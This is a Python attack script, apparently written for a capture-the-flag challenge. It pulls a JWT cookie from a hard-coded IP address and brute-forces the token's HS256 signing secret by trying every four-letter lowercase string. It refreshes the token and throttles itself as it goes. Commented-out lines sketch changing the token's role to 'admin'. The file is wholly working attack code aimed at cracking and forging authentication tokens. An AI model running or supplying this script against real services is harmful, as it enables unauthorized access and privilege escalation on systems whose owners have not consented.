import jwt
import requests
import base64
import json
import time

class JWT:

    def GetToken(self):
        burp0_url = "http://128.199.247.205:9008/"
        burp0_headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
        res = requests.get(burp0_url, headers=burp0_headers)
        token = res.headers['Set-Cookie'].split(';')[0].replace('jwt=','').strip()
        # payload = base64.b64decode(token+"=").decode('utf8')
        # payload = json.loads(payload)
        # payload['role'] = 'admin'
        # print(payload)
        return token
    
    def BruteSecret(self):
        characters = 'abcdefghijklmnopqrstuvwxyz'
        count = 0
        token = self.GetToken()
        print(token)
        
        for a in characters:
            for b in characters:
                for c in characters:
                    for d in characters:
                            if count == 100:
                                count = 0
                                time.sleep(1)
                                token = self.GetToken()
                                
                            secret_key = a + b + c + d
                            print(secret_key)
                            flag = self.decode(secret_key, token)
                            count += 1
                            if flag == True:
                                return
    def encode(self, payload, secret_key):
        token = jwt.encode(payload, secret_key, algorithm='HS256')
        return token

    def decode(self, secret_key, token):
        try:
            decoded_payload = jwt.decode(token, secret_key, algorithms=['HS256'])
            print("Decoded Payload:", decoded_payload)
            return True
        except jwt.ExpiredSignatureError:
            print("Token has expired")
        except jwt.InvalidTokenError:
            print("Invalid token")


app = JWT()
app.BruteSecret()